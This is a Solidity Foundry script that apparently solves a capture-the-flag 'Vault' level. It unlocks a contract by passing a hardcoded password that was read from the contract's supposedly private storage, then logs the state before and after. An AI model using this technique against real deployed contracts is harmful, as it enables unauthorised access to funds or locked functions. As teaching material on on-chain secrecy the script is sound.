// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract VaultSolution is Script {
    Vault constant vaultInstance =
        Vault(0x2Fb5335a18B48F404D6fc4F777ADbEDa29288E05);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(vaultInstance.locked());
        vaultInstance.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        console.log(vaultInstance.locked());
        vm.stopBroadcast();
    }
}
